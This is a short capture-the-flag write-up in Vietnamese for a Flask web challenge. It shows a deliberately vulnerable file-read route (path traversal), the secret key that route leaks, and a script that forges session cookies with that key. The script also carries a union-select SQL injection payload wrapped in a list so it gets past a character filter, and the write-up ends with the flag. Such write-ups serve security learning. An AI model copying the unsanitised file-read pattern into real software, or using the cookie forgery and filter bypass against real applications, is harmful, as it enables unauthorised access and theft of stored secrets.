# Phân tích

Server bị lỗi LFI ở đoạn code sau:

```py
@app.route('/read_note', methods=['GET'])
def read_note():
	filename = request.args.get('filename')
	f = open("notes/" + filename, 'r')
	content = f.read()
	f.close()
```

Nhờ đó ta có thể đọc được SECRET_KEY
`SECRET_KEY='oHhh_n0000OooooO___YoU_shOUldnt_kn0vv_mY_k3333yyyy'`

Có được `SECRET_KEY` bước tiếp theo là sqli để lấy  `secret_key` lưu trong table `users`

Hàm waf_filter làm cho việc thực hiện sqli rất khó khăn
```py
def waf_filter(s): 
    forbids = ["'", '"', '*', '\\', '/', '#', ';', '--'] 
    for c in forbids: 
        if c in s: 
            s = s.replace(c, '') 
    return s
```
Nhưng nếu `s` này là list thì có thể bypass dễ dàng

# Solution

```py
from flask import Flask, request, session

app = Flask(__name__)
app.secret_key = "oHhh_n0000OooooO___YoU_shOUldnt_kn0vv_mY_k3333yyyy"

@app.route('/', methods=['GET'])
def index():
    #session['username'] = [f" union select 1, 2, 3, secret_key from users-- -"]     # dùng để lấy secret_key
    session['username'] = "admin"
    session['secret_key'] = "a7c12766bab05dd16fba6d6d3aee3d23"
    return "blabla"

if __name__ == '__main__':
	# debug=True: server will be auto-reloaded when you modify source code
	app.run(host="0.0.0.0", port=8888, debug=True)
```

Flag
**HCMUS-CTF{Pyth0n___\`in\`_k3yw0rddd_+++_n0t__0nLY___work__4_str__buT_4ls0_dict}**